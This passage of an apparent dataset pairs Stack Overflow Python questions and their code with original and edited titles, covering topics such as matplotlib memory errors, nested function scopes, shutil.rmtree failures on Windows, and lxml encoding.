AAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nAAAAAAAAAAAAAAAAAIcAeHkAAeLqlDIAAAAASUVORK5CYII=",Convert string in base64 to image and save on filesystem
Is there a Python equivalent for the Perl module Term:VT102?," In Perl there is a very handy module, Term::VT102, which allows you to create a screen in memory. This is very handy for scraping purposes since you can keep track of all the changes to portions of the screen and then export the screen as plain-text for processing. Is there an equivalent module in Python?Followup Question: There are modules like Pexpect that allow you to screen scrape a VT100 screen, but how does VT100 differ from VT102? <code> ",Is there a Python equivalent for the Perl module Term::VT102?
Set a DTD using minidom," I am trying to include a reference to a DTD in my XML doc using minidom. I am creating the document like: This gives me: I need to get something like: <code>  doc = Document()foo = doc.createElement('foo')doc.appendChild(foo)doc.toxml() <?xml version=""1.0"" ?><foo/> <?xml version=""1.0"" ?><!DOCTYPE something SYSTEM ""http://www.path.to.my.dtd.com/my.dtd""><foo/>",Set a DTD using minidom in python.
Why is post data copied in Django?," Django code samples involving post data often shows code similar to this: Is there a reason for copying the post data instead of working with it directly? <code>  if request.method == ""POST"": post = request.POST.copy() #do stuff with post data",Why copy post data in Django instead of working with it directly?
"Python - Internally, what is stored on the stack and heap?"," In C#, Value Types (eg: int, float, etc) are stored on the stack. Method parameters may also be stored on the stack as well. Most everything else, however, is stored on the heap. This includes Lists, objects, etc.I was wondering, does CPython do the same thing internally? What does it store on the stack, and what does it put on the heap? <code> ","CPython - Internally, what is stored on the stack and heap?"
"In Python, what exactly does import * import?"," In Python, what exactly does import * import? Does it import __init__.py found in the containing folder?For example, is it necessary to declare from project.model import __init__, or is from project.model import * sufficient? <code> ","What exactly does ""import *"" import?"
"In Python, what exactly does `import *` import?"," In Python, what exactly does import * import? Does it import __init__.py found in the containing folder?For example, is it necessary to declare from project.model import __init__, or is from project.model import * sufficient? <code> ","What exactly does ""import *"" import?"
"In Python, what exactly does import * import?"," In Python, what exactly does import * import? Does it import __init__.py found in the containing folder?For example, is it necessary to declare from project.model import __init__, or is from project.model import * sufficient? <code> ","What exactly does ""import *"" import?"
"In Python, what exactly does ""import *"" import?"," In Python, what exactly does import * import? Does it import __init__.py found in the containing folder?For example, is it necessary to declare from project.model import __init__, or is from project.model import * sufficient? <code> ","What exactly does ""import *"" import?"
Matplotlib runs out of memory when plotting in a loop," I have a fairly simple plotting routine that looks like this: When I plot this in single iterations, it works fine. However, the moment I put it in a loop, matplotlib throws a hissy fit... This happens on iteration 2 (counting from 1), if that makes a difference. The code is running on Windows XP 32-bit with python 2.5 and matplotlib 0.99.1, numpy 1.3.0 and scipy 0.7.1.EDIT: The code has now been updated to reflect the fact that the crash actually occurs at the call to legend(). Commenting that call out solves the problem, though obviously, I would still like to be able to put a legend on my graphs... <code>  from __future__ import divisionimport datetimeimport matplotlibmatplotlib.use('Agg')from matplotlib.pyplot import figure, plot, show, legend, close, savefig, rcParamsimport numpyfrom globalconstants import * def plotColumns(columnNumbers, t, out, showFig=False, filenamePrefix=None, saveFig=True, saveThumb=True): lineProps = ['b', 'r', 'g', 'c', 'm', 'y', 'k', 'b--', 'r--', 'g--', 'c--', 'm--', 'y--', 'k--', 'g--', 'b.-', 'r.-', 'g.-', 'c.-', 'm.-', 'y.-', 'k.-'] rcParams['figure.figsize'] = (13,11) for i in columnNumbers: plot(t, out[:,i], lineProps[i]) legendStrings = list(numpy.zeros(NUMCOMPONENTS)) legendStrings[GLUCOSE] = 'GLUCOSE' legendStrings[CELLULOSE] = 'CELLULOSE' legendStrings[STARCH] = 'STARCH' legendStrings[ACETATE] = 'ACETATE' legendStrings[BUTYRATE] = 'BUTYRATE' legendStrings[SUCCINATE] = 'SUCCINATE' legendStrings[HYDROGEN] = 'HYDROGEN' legendStrings[PROPIONATE] = 'PROPIONATE' legendStrings[METHANE] = ""METHANE"" legendStrings[RUMINOCOCCUS] = 'RUMINOCOCCUS' legendStrings[METHANOBACTERIUM] = ""METHANOBACTERIUM"" legendStrings[BACTEROIDES] = 'BACTEROIDES' legendStrings[SELENOMONAS] = 'SELENOMONAS' legendStrings[CLOSTRIDIUM] = 'CLOSTRIDIUM' legendStrings = [legendStrings[i] for i in columnNumbers] legend(legendStrings, loc='best') dt = datetime.datetime.now() dtAsString = dt.strftime('%d-%m-%Y_%H-%M-%S') if filenamePrefix is None: filenamePrefix = '' if filenamePrefix != '' and filenamePrefix[-1] != '_': filenamePrefix += '_' if saveFig: savefig(filenamePrefix+dtAsString+'.eps') if saveThumb: savefig(filenamePrefix+dtAsString+'.png', dpi=300) if showFig: f.show() close('all') Traceback (most recent call last): File ""c4hm_param_variation_h2_conc.py"", line 148, in <module> plotColumns(columnNumbers, timeVector, out, showFig=False, filenamePrefix='c4hm_param_variation_h2_conc_'+str(hydrogen_conc), saveFig=False, saveThumb=True) File ""D:\phdproject\alexander paper\python\v3\plotcolumns.py"", line 48, in plotColumns savefig(filenamePrefix+dtAsString+'.png', dpi=300) File ""C:\Python25\lib\site-packages\matplotlib\pyplot.py"", line 356, in savefig return fig.savefig(*args, **kwargs) File ""C:\Python25\lib\site-packages\matplotlib\figure.py"", line 1032, in savefig self.canvas.print_figure(*args, **kwargs) File ""C:\Python25\lib\site-packages\matplotlib\backend_bases.py"", line 1476, in print_figure **kwargs) File ""C:\Python25\lib\site-packages\matplotlib\backends\backend_agg.py"", line358, in print_png FigureCanvasAgg.draw(self) File ""C:\Python25\lib\site-packages\matplotlib\backends\backend_agg.py"", line314, in draw self.figure.draw(self.renderer) File ""C:\Python25\lib\site-packages\matplotlib\artist.py"", line 46, in draw_wrapper draw(artist, renderer, *kl) File ""C:\Python25\lib\site-packages\matplotlib\figure.py"", line 773, in draw for a in self.axes: a.draw(renderer) File ""C:\Python25\lib\site-packages\matplotlib\artist.py"", line 46, in draw_wrapper draw(artist, renderer, *kl) File ""C:\Python25\lib\site-packages\matplotlib\axes.py"", line 1735, in draw a.draw(renderer) File ""C:\Python25\lib\site-packages\matplotlib\artist.py"", line 46, in draw_wrapper draw(artist, renderer, *kl) File ""C:\Python25\lib\site-packages\matplotlib\legend.py"", line 374, in draw bbox = self._legend_box.get_window_extent(renderer) File ""C:\Python25\lib\site-packages\matplotlib\offsetbox.py"", line 209, in get_window_extent px, py = self.get_offset(w, h, xd, yd) File ""C:\Python25\lib\site-packages\matplotlib\offsetbox.py"", line 162, in get_offset return self._offset(width, height, xdescent, ydescent) File ""C:\Python25\lib\site-packages\matplotlib\legend.py"", line 360, in findoffset return _findoffset(width, height, xdescent, ydescent, renderer) File ""C:\Python25\lib\site-packages\matplotlib\legend.py"", line 325, in _findoffset_best ox, oy = self._find_best_position(width, height, renderer) File ""C:\Python25\lib\site-packages\matplotlib\legend.py"", line 817, in _find_best_position verts, bboxes, lines = self._auto_legend_data() File ""C:\Python25\lib\site-packages\matplotlib\legend.py"", line 669, in _auto_legend_data tpath = trans.transform_path(path) File ""C:\Python25\lib\site-packages\matplotlib\transforms.py"", line 1911, in transform_path self._a.transform_path(path)) File ""C:\Python25\lib\site-packages\matplotlib\transforms.py"", line 1122, in transform_path return Path(self.transform(path.vertices), path.codes, File ""C:\Python25\lib\site-packages\matplotlib\transforms.py"", line 1402, in transform return affine_transform(points, mtx)MemoryError: Could not allocate memory for path",Matplotlib runs out of memory when plotting in a loop
Matplotlib runs out of memory when plotting in a loop - EDITED," I have a fairly simple plotting routine that looks like this: When I plot this in single iterations, it works fine. However, the moment I put it in a loop, matplotlib throws a hissy fit... This happens on iteration 2 (counting from 1), if that makes a difference. The code is running on Windows XP 32-bit with python 2.5 and matplotlib 0.99.1, numpy 1.3.0 and scipy 0.7.1.EDIT: The code has now been updated to reflect the fact that the crash actually occurs at the call to legend(). Commenting that call out solves the problem, though obviously, I would still like to be able to put a legend on my graphs... <code>  from __future__ import divisionimport datetimeimport matplotlibmatplotlib.use('Agg')from matplotlib.pyplot import figure, plot, show, legend, close, savefig, rcParamsimport numpyfrom globalconstants import * def plotColumns(columnNumbers, t, out, showFig=False, filenamePrefix=None, saveFig=True, saveThumb=True): lineProps = ['b', 'r', 'g', 'c', 'm', 'y', 'k', 'b--', 'r--', 'g--', 'c--', 'm--', 'y--', 'k--', 'g--', 'b.-', 'r.-', 'g.-', 'c.-', 'm.-', 'y.-', 'k.-'] rcParams['figure.figsize'] = (13,11) for i in columnNumbers: plot(t, out[:,i], lineProps[i]) legendStrings = list(numpy.zeros(NUMCOMPONENTS)) legendStrings[GLUCOSE] = 'GLUCOSE' legendStrings[CELLULOSE] = 'CELLULOSE' legendStrings[STARCH] = 'STARCH' legendStrings[ACETATE] = 'ACETATE' legendStrings[BUTYRATE] = 'BUTYRATE' legendStrings[SUCCINATE] = 'SUCCINATE' legendStrings[HYDROGEN] = 'HYDROGEN' legendStrings[PROPIONATE] = 'PROPIONATE' legendStrings[METHANE] = ""METHANE"" legendStrings[RUMINOCOCCUS] = 'RUMINOCOCCUS' legendStrings[METHANOBACTERIUM] = ""METHANOBACTERIUM"" legendStrings[BACTEROIDES] = 'BACTEROIDES' legendStrings[SELENOMONAS] = 'SELENOMONAS' legendStrings[CLOSTRIDIUM] = 'CLOSTRIDIUM' legendStrings = [legendStrings[i] for i in columnNumbers] legend(legendStrings, loc='best') dt = datetime.datetime.now() dtAsString = dt.strftime('%d-%m-%Y_%H-%M-%S') if filenamePrefix is None: filenamePrefix = '' if filenamePrefix != '' and filenamePrefix[-1] != '_': filenamePrefix += '_' if saveFig: savefig(filenamePrefix+dtAsString+'.eps') if saveThumb: savefig(filenamePrefix+dtAsString+'.png', dpi=300) if showFig: f.show() close('all') Traceback (most recent call last): File ""c4hm_param_variation_h2_conc.py"", line 148, in <module> plotColumns(columnNumbers, timeVector, out, showFig=False, filenamePrefix='c4hm_param_variation_h2_conc_'+str(hydrogen_conc), saveFig=False, saveThumb=True) File ""D:\phdproject\alexander paper\python\v3\plotcolumns.py"", line 48, in plotColumns savefig(filenamePrefix+dtAsString+'.png', dpi=300) File ""C:\Python25\lib\site-packages\matplotlib\pyplot.py"", line 356, in savefig return fig.savefig(*args, **kwargs) File ""C:\Python25\lib\site-packages\matplotlib\figure.py"", line 1032, in savefig self.canvas.print_figure(*args, **kwargs) File ""C:\Python25\lib\site-packages\matplotlib\backend_bases.py"", line 1476, in print_figure **kwargs) File ""C:\Python25\lib\site-packages\matplotlib\backends\backend_agg.py"", line358, in print_png FigureCanvasAgg.draw(self) File ""C:\Python25\lib\site-packages\matplotlib\backends\backend_agg.py"", line314, in draw self.figure.draw(self.renderer) File ""C:\Python25\lib\site-packages\matplotlib\artist.py"", line 46, in draw_wrapper draw(artist, renderer, *kl) File ""C:\Python25\lib\site-packages\matplotlib\figure.py"", line 773, in draw for a in self.axes: a.draw(renderer) File ""C:\Python25\lib\site-packages\matplotlib\artist.py"", line 46, in draw_wrapper draw(artist, renderer, *kl) File ""C:\Python25\lib\site-packages\matplotlib\axes.py"", line 1735, in draw a.draw(renderer) File ""C:\Python25\lib\site-packages\matplotlib\artist.py"", line 46, in draw_wrapper draw(artist, renderer, *kl) File ""C:\Python25\lib\site-packages\matplotlib\legend.py"", line 374, in draw bbox = self._legend_box.get_window_extent(renderer) File ""C:\Python25\lib\site-packages\matplotlib\offsetbox.py"", line 209, in get_window_extent px, py = self.get_offset(w, h, xd, yd) File ""C:\Python25\lib\site-packages\matplotlib\offsetbox.py"", line 162, in get_offset return self._offset(width, height, xdescent, ydescent) File ""C:\Python25\lib\site-packages\matplotlib\legend.py"", line 360, in findoffset return _findoffset(width, height, xdescent, ydescent, renderer) File ""C:\Python25\lib\site-packages\matplotlib\legend.py"", line 325, in _findoffset_best ox, oy = self._find_best_position(width, height, renderer) File ""C:\Python25\lib\site-packages\matplotlib\legend.py"", line 817, in _find_best_position verts, bboxes, lines = self._auto_legend_data() File ""C:\Python25\lib\site-packages\matplotlib\legend.py"", line 669, in _auto_legend_data tpath = trans.transform_path(path) File ""C:\Python25\lib\site-packages\matplotlib\transforms.py"", line 1911, in transform_path self._a.transform_path(path)) File ""C:\Python25\lib\site-packages\matplotlib\transforms.py"", line 1122, in transform_path return Path(self.transform(path.vertices), path.codes, File ""C:\Python25\lib\site-packages\matplotlib\transforms.py"", line 1402, in transform return affine_transform(points, mtx)MemoryError: Could not allocate memory for path",Matplotlib runs out of memory when plotting in a loop
Most efficent way to create all posible combination of four lists in Python?," I have four different lists. headers, descriptions, short_descriptions and misc. I want to combine these into all the possible ways to print out: like if i had (i'm skipping short_description and misc in this example for obvious reasons) I want it to print out like: What would you say is the best/cleanest/most efficent way to do this? Is for-nesting the only way to go? <code>  header\ndescription\nshort_description\nmisc headers = ['Hello there', 'Hi there!']description = ['I like pie', 'Ho ho ho']... Hello thereI like pie...Hello thereHo ho ho...Hi there!I like pie...Hi there!Ho ho ho...",Most efficent way to create all possible combinations of four lists in Python?
Python 3.11 'else if' Syntax," I'm a new Python programmer who is making the leap from 2.6.4 to 3.1.1. Everything has gone fine until I tried to use the 'else if' statement. The interpreter gives me a syntax error after the 'if' in 'else if' for a reason I can't seem to figure out. I'm probably missing something very simple; however, I haven't been able to find the answer on my own.  <code>  def function(a): if a == '1': print ('1a') else if a == '2' print ('2a') else print ('3a')function(input('input:'))",What is the correct syntax for 'else if'?
Python 3.1.1 'else if' Syntax," I'm a new Python programmer who is making the leap from 2.6.4 to 3.1.1. Everything has gone fine until I tried to use the 'else if' statement. The interpreter gives me a syntax error after the 'if' in 'else if' for a reason I can't seem to figure out. I'm probably missing something very simple; however, I haven't been able to find the answer on my own.  <code>  def function(a): if a == '1': print ('1a') else if a == '2' print ('2a') else print ('3a')function(input('input:'))",What is the correct syntax for 'else if'?
"Pyton, print delimited list "," Consider this Python code for printing a list of comma separated values What is the preferred method for printing such that a comma does not appear if element is the final element in the list.ex <code>  for element in list: print element + "","", a = [1, 2, 3]for element in a print str(element) +"","",output1,2,3,desired1,2,3","Python, print delimited list "
 [Python] What is the easiest way to convert list with str into list with int? =) ," What is the easiest way to convert list with str into list with int in Python? For example, we have to convert ['1', '2', '3'] to [1, 2, 3]. Of course, we can use a for loop, but it's too easy. <code> ",What is the easiest way to convert list with str into list with int?
What is the easiest way to convert list with str into list with int? =) ," What is the easiest way to convert list with str into list with int in Python? For example, we have to convert ['1', '2', '3'] to [1, 2, 3]. Of course, we can use a for loop, but it's too easy. <code> ",What is the easiest way to convert list with str into list with int?
Copy and pasting code into the Python interpreter, There is a snippet of code that I would like to copy and paste into my Python interpreter. Unfortunately due to Python's sensitivity to whitespace it is not straightforward to copy and paste it a way that makes sense. (I think the whitespace gets mangled) Is there a better way? Maybe I can load the snippet from a file. This is just an small example but if there is a lot of code I would like to avoid typing everything from the definition of the function or copy and pasting line by line.  <code>  class bcolors: HEADER = '\033[95m' OKBLUE = '\033[94m' OKGREEN = '\033[92m' WARNING = '\033[93m' FAIL = '\033[91m' ENDC = '\033[0m' def disable(self): self.HEADER = '' # I think stuff gets mangled because of the extra level of indentation self.OKBLUE = '' self.OKGREEN = '' self.WARNING = '' self.FAIL = '' self.ENDC = '',Copying and pasting code into the Python interpreter
How to write Unix end of line characters in Windows using Python," How can I write to files using Python (on Windows) and use the Unix end of line character?e.g. When doing: Python automatically replaces \n with \r\n. <code>  f = open('file.txt', 'w')f.write('hello\n')f.close()",How to write Unix end of line characters in Windows?
"How can I tell if a given login exists in my Linux box, using Python?"," What is the easiest way to check the existence of a user on a GNU/Linux OS, using Python?Anything better than issuing ls ~login-name and checking the exit code?And if running under Windows? <code> ",How to check if a user exists in a GNU/Linux OS using Python?
Tell if a given login exists in Linux using Python," What is the easiest way to check the existence of a user on a GNU/Linux OS, using Python?Anything better than issuing ls ~login-name and checking the exit code?And if running under Windows? <code> ",How to check if a user exists in a GNU/Linux OS using Python?
find nearest value in numpy array," Is there a numpy-thonic way, e.g. function, to find the nearest value in an array? Example: <code>  np.find_nearest( array, value )",Find nearest value in numpy array
Get Django form field from model field," I'd like to create a form that includes fields from two separate models, along with some other regular (non-model) fields. The form will create an instance of each model. I don't think I can use inline formsets for this, since I don't want to include all the fields from both models.I'd like to create the form field without hard-coding the type of the model fields.I know I can get a form field from a model field using model_field.formfield(). But how can I get the specific model field?My first solution: Is there an equivalent of get_fields already? Is this a bad idea? I'm uncomfortable relying on the model _meta attribute. Or am I going about this the completely wrong way? <code>  def get_fields(model_class): fields = {} for f in model_class._meta.fields: fields[f.name] = fclass MyForm(forms.Form): foo_name = get_fields(Foo)['name'].formfield() bar_name = get_fields(Bar)['name'].formfield() other_field = ...",How to get Django form field from model field?
Python nested function scopes," I have code like this (simplified): But ctr causes an error: How can I fix this? I thought nested scopes would have allowed me to do this. I've tried with 'global', but it still doesn't work. <code>  def outer(): ctr = 0 def inner(): ctr += 1 inner() Traceback (most recent call last): File ""foo.py"", line 9, in <module> outer() File ""foo.py"", line 7, in outer inner() File ""foo.py"", line 5, in inner ctr += 1UnboundLocalError: local variable 'ctr' referenced before assignment",UnboundLocalError with nested function scopes
error in python d not defined. ," I am learning python and have this error . I can figure out where\what the error is in the code.File ""<string>"", line 1, in <module>. When i run the program it outputsWhat is your Name? (i input d )this gives the error This is an example code from Python 3 for Absolute Beginners. <code>  Name = """"Desc = """"Gender = """"Race = """"# Prompt user for user-defined informationName = input('What is your Name? ')Desc = input('Describe yourself: ') Traceback (most recent call last): File ""/python/chargen.py"", line 19, in <module> Name = input('What is your Name? ') File ""<string>"", line 1, in <module>NameError: name 'd' is not defined",error in python d not defined.
"Why the good append syntax is so ugly, asks python newbie"," Now following my series of ""python newbie questions"" and based on another question.PrerogativeGo to http://python.net/~goodger/projects/pycon/2007/idiomatic/handout.html#other-languages-have-variables and scroll down to ""Default Parameter Values"". There you can find the following: There's even an ""Important warning"" on python.org with this very same example, tho not really saying it's ""better"".One way to put itSo, question here is: why is the ""good"" syntax over a known issue ugly like that in a programming language that promotes ""elegant syntax"" and ""easy-to-use""?edit:Another way to put itI'm not asking why or how it happens (thanks Mark for the link).I'm asking why there's no simpler alternative built-in the language.I think a better way would probably being able to do something in the def itself, in which the name argument would be attached to a ""local"", or ""new"" within the def, mutable object. Something like: I'm sure someone can come with a better syntax, but I'm also guessing there must be a very good explanation to why this hasn't been done. <code>  def bad_append(new_item, a_list=[]): a_list.append(new_item) return a_listdef good_append(new_item, a_list=None): if a_list is None: a_list = [] a_list.append(new_item) return a_list def better_append(new_item, a_list=immutable([])): a_list.append(new_item) return a_list","Why the ""mutable default argument fix"" syntax is so ugly, asks python newbie"
shutil.rmtree fails on Windows with 'Access is denied'," In Python, when running shutil.rmtree over a folder that contains a read-only file, the following exception is printed: Looking in File Properties dialog I noticed that af.msg file is set to be read-only. So the question is: what is the simplest workaround/fix to get around this problem - given that my intention is to do an equivalent of rm -rf build/ but on Windows? (without having to use third-party tools like unxutils or cygwin - as this code is targeted to be run on a bare Windows install with Python 2.6 w/ PyWin32 installed) <code>  File ""C:\Python26\lib\shutil.py"", line 216, in rmtree rmtree(fullname, ignore_errors, onerror) File ""C:\Python26\lib\shutil.py"", line 216, in rmtree rmtree(fullname, ignore_errors, onerror) File ""C:\Python26\lib\shutil.py"", line 216, in rmtree rmtree(fullname, ignore_errors, onerror) File ""C:\Python26\lib\shutil.py"", line 216, in rmtree rmtree(fullname, ignore_errors, onerror) File ""C:\Python26\lib\shutil.py"", line 216, in rmtree rmtree(fullname, ignore_errors, onerror) File ""C:\Python26\lib\shutil.py"", line 216, in rmtree rmtree(fullname, ignore_errors, onerror) File ""C:\Python26\lib\shutil.py"", line 216, in rmtree rmtree(fullname, ignore_errors, onerror) File ""C:\Python26\lib\shutil.py"", line 221, in rmtree onerror(os.remove, fullname, sys.exc_info()) File ""C:\Python26\lib\shutil.py"", line 219, in rmtree os.remove(fullname)WindowsError: [Error 5] Access is denied: 'build\\tcl\\tcl8.5\\msgs\\af.msg'",shutil.rmtree fails on Windows with 'Access is denied'
Python: shutil.rmtree fails on Windows with 'Access is denied'," In Python, when running shutil.rmtree over a folder that contains a read-only file, the following exception is printed: Looking in File Properties dialog I noticed that af.msg file is set to be read-only. So the question is: what is the simplest workaround/fix to get around this problem - given that my intention is to do an equivalent of rm -rf build/ but on Windows? (without having to use third-party tools like unxutils or cygwin - as this code is targeted to be run on a bare Windows install with Python 2.6 w/ PyWin32 installed) <code>  File ""C:\Python26\lib\shutil.py"", line 216, in rmtree rmtree(fullname, ignore_errors, onerror) File ""C:\Python26\lib\shutil.py"", line 216, in rmtree rmtree(fullname, ignore_errors, onerror) File ""C:\Python26\lib\shutil.py"", line 216, in rmtree rmtree(fullname, ignore_errors, onerror) File ""C:\Python26\lib\shutil.py"", line 216, in rmtree rmtree(fullname, ignore_errors, onerror) File ""C:\Python26\lib\shutil.py"", line 216, in rmtree rmtree(fullname, ignore_errors, onerror) File ""C:\Python26\lib\shutil.py"", line 216, in rmtree rmtree(fullname, ignore_errors, onerror) File ""C:\Python26\lib\shutil.py"", line 216, in rmtree rmtree(fullname, ignore_errors, onerror) File ""C:\Python26\lib\shutil.py"", line 221, in rmtree onerror(os.remove, fullname, sys.exc_info()) File ""C:\Python26\lib\shutil.py"", line 219, in rmtree os.remove(fullname)WindowsError: [Error 5] Access is denied: 'build\\tcl\\tcl8.5\\msgs\\af.msg'",shutil.rmtree fails on Windows with 'Access is denied'
Counting longest occurence of repeated sequence in Python," What's the easiest way to count the longest consecutive repeat of a certain character in a string? For example, the longest consecutive repeat of ""b"" in the following string: would be 6, since other consecutive repeats are shorter (3 and 2, respectively.) How can I do this in Python? <code>  my_str = ""abcdefgfaabbbffbbbbbbfgbb""",Counting longest occurrence of repeated sequence in Python
Objetcs array with numpy, are there any way to create an object form any class inside a numpy array?. Something like: Thanks <code>  a = zeros(4)for i in range(4): a[i]=Register(),Objects array with numpy
Python f.write() at beginning of file?," I'm doing it like this now, but I want it to write at the beginning of the file instead. so that the contents of out.txt will be: and not (like this code does): <code>  f = open('out.txt', 'a') # or 'w'?f.write(""string 1"")f.write(""string 2"")f.write(""string 3"")f.close() string 3string 2string 1 string 1string 2string 3",write() at beginning of file?
cant download youtube video," Im having trouble retrieving the Youtube video automatically. Heres the code. The problem is the last part. download = urllib.request.urlopen(download_url).read() Theres an error message: (thanks Wooble) <code>  # Youtube video download script # 10n1z3d[at]w[dot]cn import urllib.request import sys print(""\n--------------------------"") print ("" Youtube Video Downloader"") print (""--------------------------\n"") try: video_url = sys.argv[1] except: video_url = input('[+] Enter video URL: ') print(""[+] Connecting..."") try: if(video_url.endswith('&feature=related')): video_id = video_url.split('www.youtube.com/watch?v=')[1].split('&feature=related')[0] elif(video_url.endswith('&feature=dir')): video_id = video_url.split('www.youtube.com/watch?v=')[1].split('&feature=dir')[0] elif(video_url.endswith('&feature=fvst')): video_id = video_url.split('www.youtube.com/watch?v=')[1].split('&feature=fvst')[0] elif(video_url.endswith('&feature=channel_page')): video_id = video_url.split('www.youtube.com/watch?v=')[1].split('&feature=channel_page')[0] else: video_id = video_url.split('www.youtube.com/watch?v=')[1] except: print(""[-] Invalid URL."") exit(1) print(""[+] Parsing token..."") try: url = str(urllib.request.urlopen('http://www.youtube.com/get_video_info?&video_id=' + video_id).read()) token_value = url.split('video_id='+video_id+'&token=')[1].split('&thumbnail_url')[0] download_url = ""http://www.youtube.com/get_video?video_id="" + video_id + ""&t="" + token_value + ""&fmt=18"" except: url = str(urllib.request.urlopen('www.youtube.com/watch?v=' + video_id)) exit(1) v_url=str(urllib.request.urlopen('http://'+video_url).read()) video_title = v_url.split('""rv.2.title"": ""')[1].split('"", ""rv.4.rating""')[0] if '&quot;' in video_title: video_title = video_title.replace('&quot;','""') elif '&amp;' in video_title: video_title = video_title.replace('&amp;','&') print(""[+] Downloading "" + '""' + video_title + '""...') try: print(download_url) file = open(video_title + '.mp4', 'wb') download = urllib.request.urlopen(download_url).read() print(download) for line in download: file.write(line) file.close() except: print(""[-] Error downloading. Quitting."") exit(1) print(""\n[+] Done. The video is saved to the current working directory(cwd).\n"") Traceback (most recent call last): File ""C:/Python31/MyLib/DrawingBoard/youtube_download-.py"", line 52, in <module> download = urllib.request.urlopen(download_url).read() File ""C:\Python31\lib\urllib\request.py"", line 119, in urlopen return _opener.open(url, data, timeout) File ""C:\Python31\lib\urllib\request.py"", line 353, in open response = meth(req, response) File ""C:\Python31\lib\urllib\request.py"", line 465, in http_response 'http', request, response, code, msg, hdrs) File ""C:\Python31\lib\urllib\request.py"", line 385, in error result = self._call_chain(*args) File ""C:\Python31\lib\urllib\request.py"", line 325, in _call_chain result = func(*args) File ""C:\Python31\lib\urllib\request.py"", line 560, in http_error_302 return self.parent.open(new, timeout=req.timeout) File ""C:\Python31\lib\urllib\request.py"", line 353, in open response = meth(req, response) File ""C:\Python31\lib\urllib\request.py"", line 465, in http_response 'http', request, response, code, msg, hdrs) File ""C:\Python31\lib\urllib\request.py"", line 391, in error return self._call_chain(*args) File ""C:\Python31\lib\urllib\request.py"", line 325, in _call_chain result = func(*args) File ""C:\Python31\lib\urllib\request.py"", line 473, in http_error_default raise HTTPError(req.full_url, code, msg, hdrs, fp)urllib.error.HTTPError: HTTP Error 403: Forbidden ",Cant download youtube video
Encoding  in python with lxml - complex solution," I need to download and parse webpage with lxml and build UTF-8 xml output. I think schema in pseudocode is more illustrative: So webfile can be in any encoding (lxml should handle this). Outputfile have to be in utf-8. I'm not sure where to use encoding/coding. Is this schema ok? (I cant find good tutorial about lxml and encoding, but I can find many problems with this...) I need robust solution.Edit:So for sending utf-8 to lxml I use <code>  from lxml import etreewebfile = urllib2.urlopen(url)root = etree.parse(webfile.read(), parser=etree.HTMLParser(recover=True))txt = my_process_text(etree.tostring(root.xpath('/html/body'), encoding=utf8))output = etree.Element(""out"")output.text = txtoutputfile.write(etree.tostring(output, encoding=utf8)) converted = UnicodeDammit(webfile, isHTML=True) if not converted.unicode: print ""ERR. UnicodeDammit failed to detect encoding, tried [%s]"", \ ', '.join(converted.triedEncodings) continue webfile = converted.unicode.encode('utf-8')",Encoding in python with lxml - complex solution
